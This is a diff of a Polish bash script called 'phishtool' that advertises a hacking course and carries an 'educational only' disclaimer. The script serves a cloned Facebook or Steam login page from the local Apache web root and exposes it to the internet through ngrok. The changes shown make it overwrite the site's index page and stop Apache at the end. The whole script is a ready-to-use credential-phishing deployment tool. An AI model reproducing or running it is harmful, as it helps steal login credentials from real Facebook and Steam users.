@@ -1,5 +1,5 @@
 #!/bin/bash
-echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 1.0"
+echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 1.1"
 sleep 2
 echo "kup kurs na www.ehaker.pl"
 sleep 2
@@ -16,19 +16,20 @@ read opcja
 if [ $opcja = 1 ]
 then
 	echo "wybrales fb";
-	#sudo rm /var/www/html/index.html
+	sudo rm /var/www/html/index.html
 	sudo cp facebook/index.html /var/www/html/index.html
-	sudo ./ngrok http 80
+	./ngrok http 80
 	sudo rm /var/www/html/index.html
 else
 	echo "wybrales Steama";
-	#sudo rm /var/www/html/index.html
+	sudo rm /var/www/html/index.html
 	sudo cp steam/index.html /var/www/html/index.html
-	sudo ./ngrok http 80
+	./ngrok http 80
 	sudo rm /var/www/html/index.html
 
 
 echo " Narzędzie zakończyło pracę "
+sudo service apache2 stop
 sleep 2
 exit
 fi
